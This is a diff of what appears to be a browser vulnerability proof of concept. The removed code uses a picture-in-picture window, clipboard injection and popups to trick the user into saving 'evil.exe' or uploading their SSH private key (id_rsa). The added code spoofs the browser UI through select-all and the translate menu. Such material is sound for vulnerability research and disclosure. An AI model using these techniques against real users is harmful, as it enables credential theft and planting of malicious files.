@@ -1,68 +1,30 @@
-<button onclick="start()">Click here</button>
-<input id="upload" type="file" style="display:none" onchange="loadFile(this.files[0])">
 
-<pre id="contents"></pre>
+<html onmousedown="rfsSelectAll()" onclick="selectAllChildren()">
 
 <script>
-const fileWritePath = "%userprofile%\\\\evil.exe";
-const fileReadPath = "%userprofile%\\\\.ssh\\\\id_rsa";
+    function rfsSelectAll() {
+        document.execCommand("selectAll");
+      document.getElementById("spoof").style   = "display: block;";
 
-async function loadFile(file) {
-  window.moveTo(0, 0);
-  window.resizeTo(500, 500);
-  alert(`Read ${fileReadPath}:\n` + await (new Response(file)).text());
-}
+    }
 
-const pipOpen = async () => {
-  pipWindow = await documentPictureInPicture.requestWindow({
-    width: Math.pow(2,32),
-    height: Math.pow(2,32),
-  });
-  pipWindow.document.body.innerHTML = `
-  <button onclick="read=false;eval(document.querySelector('script').innerText)">Start file writing game!</button><br>
-  <button onclick="read=true;eval(document.querySelector('script').innerText)">Start file reading game!</button>
-  <script>
-  copyToClipboard(read ? "${fileReadPath}" : "${fileWritePath}");
-  const popup = window.open("${document.location.href}", read ? "popup-read" : "popup-write", "popup");
-  popup.resizeTo(200,200);
-  popup.moveTo(window.screenLeft + 30,window.screenTop + 30);
-
-  setTimeout(()=>
-    document.body.innerHTML = "<p>Press " + (read ? "enter, then " : "") + "ctrl+v and enter to win this game!</p>",
-    400
-  );
-
-  function copyToClipboard(text) {
-    const textarea = document.createElement("textarea");
-    textarea.style.opacity = "0%";
-    textarea.textContent = text;
-    document.body.appendChild(textarea);
-    textarea.select();
-    document.execCommand("copy");
-  }
-
-  <${'/'}script>
-  `;
-};
-
-function download(data, filename, type) {
-  const file = new Blob([data], {type: type});
-  const a = document.createElement("a");
-  const url = window.URL.createObjectURL(file);
-  a.href = url;
-  a.download = filename;
-  document.body.appendChild(a);
-  a.click();
-}
-
-function start() {
-  pipOpen();
-}
-
-if (window.name == "popup-write") {
-  download("This is an evil executable", "harmless");
-  document.body.onfocus = () => setTimeout(() => window.close(), 1000);
-} else if (window.name == "popup-read") {
-  document.body.onkeydown = () => document.getElementById("upload").click();
-}
+    function selectAllChildren() {
+        document.getSelection().selectAllChildren(paragraph1);
+    }
 </script>
+
+<body>
+            <img id="spoof" style="display: none;" src="spoof.png"></img>
+
+    <img style="margin-top: 9999px;"></img>
+
+    <p id="paragraph1">
+        <!-- Trigger Translate Menu -->
+        A[=
+        ?:TLv
+        S9y
+        <!-- Trigger Translate Menu -->
+    </p>
+</body>
+
+</html>
